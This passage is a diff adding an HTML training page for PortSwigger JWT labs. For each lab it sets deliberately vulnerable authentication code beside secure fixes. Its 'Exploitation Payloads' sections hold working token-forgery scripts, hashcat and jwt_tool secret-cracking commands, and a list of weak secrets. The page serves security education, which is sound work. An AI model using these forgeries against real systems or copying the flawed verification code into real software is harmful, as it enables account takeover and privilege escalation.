@@ -1,0 +1,1570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT Code Review Playground | Security Learning</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #131a2b;
+            --bg-tertiary: #1a2540;
+            --accent-red: #ff4757;
+            --accent-green: #2ed573;
+            --accent-blue: #3742fa;
+            --accent-yellow: #ffa502;
+            --accent-purple: #8b5cf6;
+            --accent-cyan: #00d4ff;
+            --accent-pink: #ff6b9d;
+            --accent-orange: #ff9f43;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --border-color: #2a3a5c;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            padding: 20px 40px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, var(--accent-orange), var(--accent-yellow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header-badge { display: flex; gap: 10px; }
+
+        .badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-lab {
+            background: rgba(255, 159, 67, 0.2);
+            color: var(--accent-orange);
+            border: 1px solid var(--accent-orange);
+        }
+
+        .badge-count {
+            background: rgba(255, 165, 2, 0.2);
+            color: var(--accent-yellow);
+            border: 1px solid var(--accent-yellow);
+        }
+
+        .main-container { display: flex; height: calc(100vh - 80px); }
+
+        .sidebar {
+            width: 340px;
+            background: var(--bg-secondary);
+            border-right: 1px solid var(--border-color);
+            overflow-y: auto;
+            padding: 20px 0;
+        }
+
+        .sidebar-section { margin-bottom: 25px; }
+
+        .sidebar-title {
+            padding: 10px 20px;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .lab-item {
+            padding: 12px 20px;
+            cursor: pointer;
+            border-left: 3px solid transparent;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .lab-item:hover {
+            background: var(--bg-tertiary);
+            border-left-color: var(--accent-orange);
+        }
+
+        .lab-item.active {
+            background: var(--bg-tertiary);
+            border-left-color: var(--accent-yellow);
+        }
+
+        .lab-item i { font-size: 1.1rem; width: 24px; text-align: center; }
+        .lab-item .lab-name { flex: 1; font-size: 0.85rem; }
+
+        .lab-item .difficulty {
+            font-size: 0.65rem;
+            padding: 3px 8px;
+            border-radius: 10px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .difficulty.apprentice { background: rgba(46, 213, 115, 0.2); color: var(--accent-green); }
+        .difficulty.practitioner { background: rgba(255, 165, 2, 0.2); color: var(--accent-yellow); }
+        .difficulty.expert { background: rgba(255, 71, 87, 0.2); color: var(--accent-red); }
+
+        .content-area { flex: 1; overflow-y: auto; padding: 30px 40px; }
+
+        .lab-header { margin-bottom: 30px; }
+        .lab-header h2 { font-size: 1.6rem; margin-bottom: 10px; color: var(--text-primary); }
+
+        .lab-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 15px; }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .meta-item i { color: var(--accent-orange); }
+
+        .lab-description { color: var(--text-secondary); line-height: 1.7; font-size: 0.95rem; }
+
+        .vuln-section {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .vuln-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .vuln-section h3 i { color: var(--accent-red); }
+
+        .vuln-list { list-style: none; padding-left: 0; }
+
+        .vuln-list li {
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+
+        .vuln-list li::before {
+            content: '>';
+            position: absolute;
+            left: 0;
+            color: var(--accent-orange);
+        }
+
+        .code-review-section { margin-bottom: 30px; }
+
+        .code-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+
+        .code-tab {
+            padding: 10px 20px;
+            background: var(--bg-tertiary);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .code-tab:hover { border-color: var(--accent-orange); }
+
+        .code-tab.active {
+            background: var(--accent-red);
+            border-color: var(--accent-red);
+            color: white;
+        }
+
+        .code-tab.secure.active {
+            background: var(--accent-green);
+            border-color: var(--accent-green);
+        }
+
+        .code-container {
+            position: relative;
+            background: #1e1e1e;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border-color);
+            margin-bottom: 15px;
+        }
+
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 20px;
+            background: var(--bg-tertiary);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .code-filename {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+        }
+
+        .code-filename i { color: var(--accent-yellow); }
+
+        .code-block {
+            padding: 20px;
+            overflow-x: auto;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .code-block pre {
+            margin: 0;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .vuln-line {
+            background: rgba(255, 71, 87, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid var(--accent-red);
+        }
+
+        .secure-line {
+            background: rgba(46, 213, 115, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid var(--accent-green);
+        }
+
+        .payload-section {
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border-color);
+        }
+
+        .payload-section h3 {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--accent-green);
+        }
+
+        .payload-box {
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 15px;
+            border: 1px solid var(--border-color);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-yellow);
+            overflow-x: auto;
+            position: relative;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .payload-box .payload-label {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: var(--bg-secondary);
+            padding: 2px 10px;
+            font-size: 0.7rem;
+            color: var(--text-secondary);
+            border-radius: 4px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .hidden { display: none !important; }
+
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--accent-orange); }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.9rem;
+            transition: color 0.3s;
+        }
+
+        .back-link:hover { color: var(--accent-orange); }
+
+        .info-box {
+            background: rgba(139, 92, 246, 0.1);
+            border: 1px solid var(--accent-purple);
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            color: var(--accent-purple);
+        }
+
+        .info-box i { margin-right: 10px; }
+
+        .jwt-structure {
+            background: var(--bg-tertiary);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+        }
+
+        .jwt-header { color: var(--accent-red); }
+        .jwt-payload { color: var(--accent-purple); }
+        .jwt-signature { color: var(--accent-cyan); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <a href="../tools.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Tools</a>
+            <h1><i class="fas fa-key"></i> JWT Code Review Playground</h1>
+        </div>
+        <div class="header-badge">
+            <span class="badge badge-lab">PortSwigger Labs</span>
+            <span class="badge badge-count">7 Labs</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-signature"></i> Signature Flaws</div>
+                <div class="lab-item active" data-lab="lab1-unverified-sig">
+                    <i class="fas fa-times-circle" style="color: var(--accent-red);"></i>
+                    <span class="lab-name">Unverified Signature</span>
+                    <span class="difficulty apprentice">Easy</span>
+                </div>
+                <div class="lab-item" data-lab="lab2-flawed-verification">
+                    <i class="fas fa-bug" style="color: var(--accent-yellow);"></i>
+                    <span class="lab-name">Flawed Signature Verification</span>
+                    <span class="difficulty apprentice">Easy</span>
+                </div>
+                <div class="lab-item" data-lab="lab3-weak-key">
+                    <i class="fas fa-unlock" style="color: var(--accent-orange);"></i>
+                    <span class="lab-name">Weak Signing Key</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-heading"></i> Header Injection</div>
+                <div class="lab-item" data-lab="lab4-jwk-injection">
+                    <i class="fas fa-syringe" style="color: var(--accent-purple);"></i>
+                    <span class="lab-name">JWK Header Injection</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab5-jku-injection">
+                    <i class="fas fa-link" style="color: var(--accent-cyan);"></i>
+                    <span class="lab-name">JKU Header Injection</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+                <div class="lab-item" data-lab="lab6-kid-path-traversal">
+                    <i class="fas fa-folder-open" style="color: var(--accent-green);"></i>
+                    <span class="lab-name">KID Header Path Traversal</span>
+                    <span class="difficulty practitioner">Med</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="sidebar-title"><i class="fas fa-random"></i> Algorithm Attacks</div>
+                <div class="lab-item" data-lab="lab7-algorithm-confusion">
+                    <i class="fas fa-exchange-alt" style="color: var(--accent-pink);"></i>
+                    <span class="lab-name">Algorithm Confusion</span>
+                    <span class="difficulty expert">Hard</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-area">
+            <!-- Lab 1: Unverified Signature -->
+            <div id="lab1-unverified-sig" class="lab-content">
+                <div class="lab-header">
+                    <h2>Lab 1: JWT Authentication Bypass via Unverified Signature</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 10 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, Authentication</span>
+                    </div>
+                    <p class="lab-description">
+                        This lab uses JWT tokens for session handling but doesn't verify the signature at all.
+                        Attackers can modify the token payload to escalate privileges without any cryptographic knowledge.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>JWT Structure:</strong> A JWT consists of three parts - Header.Payload.Signature - each Base64URL encoded.
+                    <div class="jwt-structure">
+                        <span class="jwt-header">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span class="jwt-payload">eyJzdWIiOiJ3aWVuZXIiLCJyb2xlIjoidXNlciJ9</span>.<span class="jwt-signature">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+                    </div>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>The server extracts and trusts JWT claims without verifying the signature</li>
+                        <li>Attacker can decode the token, modify payload, and re-encode without signing</li>
+                        <li>No cryptographic verification means any modification goes undetected</li>
+                        <li>Common in applications that implement JWT incorrectly or use insecure libraries</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab1">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab1">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab1-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> auth_middleware.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import base64
+import json
+
+def get_current_user(request):
+    token = request.cookies.get('session')
+    if not token:
+        return None
+
+    # Split JWT into parts
+    parts = token.split('.')
+    if len(parts) != 3:
+        return None
+
+<span class="vuln-line">    # VULNERABLE: Only decoding payload, NOT verifying signature!</span>
+<span class="vuln-line">    payload_b64 = parts[1]</span>
+<span class="vuln-line">    # Add padding if needed</span>
+<span class="vuln-line">    payload_b64 += '=' * (4 - len(payload_b64) % 4)</span>
+<span class="vuln-line">    payload = json.loads(base64.urlsafe_b64decode(payload_b64))</span>
+
+<span class="vuln-line">    # Blindly trust the payload claims</span>
+<span class="vuln-line">    return {</span>
+<span class="vuln-line">        'username': payload.get('sub'),</span>
+<span class="vuln-line">        'role': payload.get('role')</span>
+<span class="vuln-line">    }</span>
+
+def require_admin(view_func):
+    def wrapper(request):
+        user = get_current_user(request)
+        if not user or user['role'] != 'admin':
+            return Response('Forbidden', status=403)
+        return view_func(request)
+    return wrapper</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab1-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> auth_middleware.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+from flask import current_app
+
+def get_current_user(request):
+    token = request.cookies.get('session')
+    if not token:
+        return None
+
+    try:
+<span class="secure-line">        # SECURE: Verify signature using secret key</span>
+<span class="secure-line">        payload = jwt.decode(</span>
+<span class="secure-line">            token,</span>
+<span class="secure-line">            current_app.config['JWT_SECRET_KEY'],</span>
+<span class="secure-line">            algorithms=['HS256']  # Explicitly specify allowed algorithms</span>
+<span class="secure-line">        )</span>
+
+<span class="secure-line">        # Additional validation</span>
+<span class="secure-line">        if 'sub' not in payload or 'role' not in payload:</span>
+<span class="secure-line">            return None</span>
+
+        return {
+            'username': payload.get('sub'),
+            'role': payload.get('role')
+        }
+    except jwt.InvalidTokenError as e:
+        # Log the error for security monitoring
+        current_app.logger.warning(f'Invalid JWT: {e}')
+        return None
+
+def require_admin(view_func):
+    def wrapper(request):
+        user = get_current_user(request)
+        if not user or user['role'] != 'admin':
+            return Response('Forbidden', status=403)
+        return view_func(request)
+    return wrapper</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Original Token (Base64 decoded payload)</span>
+{"sub": "wiener", "role": "user"}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Modified Token Payload</span>
+{"sub": "administrator", "role": "admin"}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Python Exploit Script</span>
+import base64
+import json
+
+token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJyb2xlIjoidXNlciJ9.sig"
+parts = token.split('.')
+
+# Decode and modify payload
+payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+payload['sub'] = 'administrator'
+payload['role'] = 'admin'
+
+# Re-encode (signature doesn't matter since it's not verified)
+new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
+forged_token = f"{parts[0]}.{new_payload}.{parts[2]}"
+print(forged_token)
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 2: Flawed Signature Verification -->
+            <div id="lab2-flawed-verification" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2>Lab 2: JWT Authentication Bypass via Flawed Signature Verification</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Apprentice</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 10 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, Algorithm None</span>
+                    </div>
+                    <p class="lab-description">
+                        The server accepts JWTs with the "none" algorithm, allowing attackers to create valid tokens
+                        without any signature. This is a classic JWT vulnerability from accepting unsigned tokens.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>Algorithm "none":</strong> JWT spec includes an "alg": "none" option for unsigned tokens,
+                    which should NEVER be accepted in production but some libraries allow it by default.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>JWT libraries may accept "alg": "none" if not explicitly disabled</li>
+                        <li>Attacker changes algorithm header to "none" and removes signature</li>
+                        <li>Server processes the token as valid since "none" means no signature required</li>
+                        <li>This bypasses all cryptographic protections completely</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab2">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab2">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab2-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-node-js"></i> jwtVerifier.js</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+
+function verifyToken(token) {
+    try {
+<span class="vuln-line">        // VULNERABLE: No algorithm restriction!</span>
+<span class="vuln-line">        // Library accepts whatever algorithm is in the header</span>
+<span class="vuln-line">        const decoded = jwt.verify(token, process.env.JWT_SECRET);</span>
+        return decoded;
+    } catch (err) {
+        return null;
+    }
+}
+
+// Alternative vulnerable pattern - decode without verify
+function getTokenPayload(token) {
+<span class="vuln-line">    // VULNERABLE: jwt.decode() does NOT verify signatures!</span>
+<span class="vuln-line">    return jwt.decode(token);</span>
+}
+
+module.exports = { verifyToken, getTokenPayload };</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab2-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-node-js"></i> jwtVerifier.js</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+
+function verifyToken(token) {
+    try {
+<span class="secure-line">        // SECURE: Explicitly specify allowed algorithms</span>
+<span class="secure-line">        const decoded = jwt.verify(token, process.env.JWT_SECRET, {</span>
+<span class="secure-line">            algorithms: ['HS256'],  // Only accept HS256</span>
+<span class="secure-line">            complete: true          // Return header info for logging</span>
+<span class="secure-line">        });</span>
+
+<span class="secure-line">        // Verify expected claims exist</span>
+<span class="secure-line">        if (!decoded.payload.sub || !decoded.payload.exp) {</span>
+<span class="secure-line">            throw new Error('Missing required claims');</span>
+<span class="secure-line">        }</span>
+
+<span class="secure-line">        // Check token expiration explicitly</span>
+<span class="secure-line">        if (decoded.payload.exp < Date.now() / 1000) {</span>
+<span class="secure-line">            throw new Error('Token expired');</span>
+<span class="secure-line">        }</span>
+
+        return decoded.payload;
+    } catch (err) {
+        console.error('JWT verification failed:', err.message);
+        return null;
+    }
+}
+
+module.exports = { verifyToken };</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Original Header</span>
+{"alg": "HS256", "typ": "JWT"}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Modified Header (Algorithm None)</span>
+{"alg": "none", "typ": "JWT"}
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Forged Token (Note: empty signature after last dot)</span>
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Python Exploit</span>
+import base64
+import json
+
+# Craft header with alg: none
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "administrator", "role": "admin"}
+
+# Base64URL encode without padding
+h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
+p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
+
+# Token with empty signature
+forged = f"{h}.{p}."
+print(forged)
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 3: Weak Signing Key -->
+            <div id="lab3-weak-key" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2>Lab 3: JWT Authentication Bypass via Weak Signing Key</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 15 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, Brute Force</span>
+                    </div>
+                    <p class="lab-description">
+                        The application uses a weak secret key to sign JWTs. Attackers can brute-force or
+                        dictionary-attack the secret to forge valid tokens for any user.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>HMAC Secrets:</strong> HMAC-SHA256 tokens signed with weak passwords (like "secret",
+                    "password123") can be cracked using tools like hashcat or jwt_tool with wordlists.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>HMAC algorithms use symmetric keys - same key signs and verifies</li>
+                        <li>If the secret is weak/common, attackers can crack it offline</li>
+                        <li>Tools like hashcat can test millions of passwords per second</li>
+                        <li>Once cracked, attacker can forge any token with valid signatures</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab3">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab3-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> config.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+from datetime import datetime, timedelta
+
+<span class="vuln-line"># VULNERABLE: Weak, guessable secret key</span>
+<span class="vuln-line">JWT_SECRET = "secret"  # or "password", "123456", etc.</span>
+
+def create_token(username, role):
+    payload = {
+        'sub': username,
+        'role': role,
+        'iat': datetime.utcnow(),
+        'exp': datetime.utcnow() + timedelta(hours=1)
+    }
+<span class="vuln-line">    # Token signed with weak key - easily crackable</span>
+<span class="vuln-line">    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')</span>
+
+def verify_token(token):
+    try:
+        return jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
+    except jwt.InvalidTokenError:
+        return None</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab3-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-python"></i> config.py</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import jwt
+import secrets
+import os
+from datetime import datetime, timedelta
+
+<span class="secure-line"># SECURE: Use cryptographically strong random secret</span>
+<span class="secure-line"># Generate with: python -c "import secrets; print(secrets.token_hex(32))"</span>
+<span class="secure-line">JWT_SECRET = os.environ.get('JWT_SECRET')</span>
+
+<span class="secure-line"># Validate secret strength at startup</span>
+<span class="secure-line">if not JWT_SECRET or len(JWT_SECRET) < 32:</span>
+<span class="secure-line">    raise ValueError("JWT_SECRET must be at least 32 characters")</span>
+
+def create_token(username, role):
+    payload = {
+        'sub': username,
+        'role': role,
+        'iat': datetime.utcnow(),
+        'exp': datetime.utcnow() + timedelta(hours=1),
+<span class="secure-line">        'jti': secrets.token_hex(16)  # Unique token ID for revocation</span>
+    }
+    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')
+
+def verify_token(token):
+    try:
+        payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
+<span class="secure-line">        # Check if token is revoked (implement token blacklist)</span>
+<span class="secure-line">        if is_token_revoked(payload.get('jti')):</span>
+<span class="secure-line">            return None</span>
+        return payload
+    except jwt.InvalidTokenError:
+        return None</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-terminal"></i> Exploitation Payloads</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Crack JWT with hashcat (mode 16500)</span>
+# Save token to file
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIifQ.sig" > jwt.txt
+
+# Crack with wordlist
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# Or use jwt_tool
+python3 jwt_tool.py [token] -C -d /usr/share/wordlists/rockyou.txt
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Forge Token After Cracking</span>
+import jwt
+
+# Use cracked secret
+secret = "secret"
+
+# Create admin token
+forged_token = jwt.encode(
+    {"sub": "administrator", "role": "admin"},
+    secret,
+    algorithm="HS256"
+)
+print(forged_token)
+                    </div>
+                    <div class="payload-box">
+                        <span class="payload-label">Common Weak Secrets to Try</span>
+secret
+password
+123456
+your-256-bit-secret
+jwt_secret_key
+changeme
+                    </div>
+                </div>
+            </div>
+
+            <!-- Lab 4: JWK Header Injection -->
+            <div id="lab4-jwk-injection" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2>Lab 4: JWT Authentication Bypass via JWK Header Injection</h2>
+                    <div class="lab-meta">
+                        <span class="meta-item"><i class="fas fa-signal"></i> Practitioner</span>
+                        <span class="meta-item"><i class="fas fa-clock"></i> 20 minutes</span>
+                        <span class="meta-item"><i class="fas fa-tag"></i> JWT, JWK, RSA</span>
+                    </div>
+                    <p class="lab-description">
+                        The server embeds the verification key in the JWT header using the "jwk" parameter
+                        and trusts it without validation. Attackers can inject their own key to sign forged tokens.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>JWK Parameter:</strong> The "jwk" header allows embedding a JSON Web Key directly in the token.
+                    Servers should NEVER trust embedded keys - they should use pre-configured trusted keys only.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> Vulnerability Explanation</h3>
+                    <ul class="vuln-list">
+                        <li>Server extracts public key from the "jwk" header parameter</li>
+                        <li>Attacker generates their own RSA keypair</li>
+                        <li>Attacker embeds their public key in the token and signs with their private key</li>
+                        <li>Server uses attacker's key to verify - signature is valid!</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4">
+                            <i class="fas fa-bug"></i> Vulnerable Code
+                        </button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab4">
+                            <i class="fas fa-shield-alt"></i> Secure Code
+                        </button>
+                    </div>
+
+                    <div class="code-container" id="lab4-vulnerable">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-node-js"></i> jwtHandler.js</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+const jwkToPem = require('jwk-to-pem');
+
+function verifyToken(token) {
+    // Decode header to extract algorithm and key
+    const decoded = jwt.decode(token, { complete: true });
+    const header = decoded.header;
+
+<span class="vuln-line">    // VULNERABLE: Trust the JWK embedded in the header!</span>
+<span class="vuln-line">    if (header.jwk) {</span>
+<span class="vuln-line">        // Convert JWK to PEM format for verification</span>
+<span class="vuln-line">        const publicKey = jwkToPem(header.jwk);</span>
+<span class="vuln-line">        </span>
+<span class="vuln-line">        // Verify with the attacker-controlled key</span>
+<span class="vuln-line">        return jwt.verify(token, publicKey, {</span>
+<span class="vuln-line">            algorithms: ['RS256']</span>
+<span class="vuln-line">        });</span>
+<span class="vuln-line">    }</span>
+
+    throw new Error('No JWK found in header');
+}</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-container hidden" id="lab4-secure">
+                        <div class="code-header">
+                            <span class="code-filename"><i class="fab fa-node-js"></i> jwtHandler.js</span>
+                        </div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+const fs = require('fs');
+
+<span class="secure-line">// SECURE: Load trusted public key from configuration</span>
+<span class="secure-line">const TRUSTED_PUBLIC_KEY = fs.readFileSync('./keys/public.pem', 'utf8');</span>
+
+function verifyToken(token) {
+    try {
+<span class="secure-line">        // SECURE: Only use pre-configured trusted key</span>
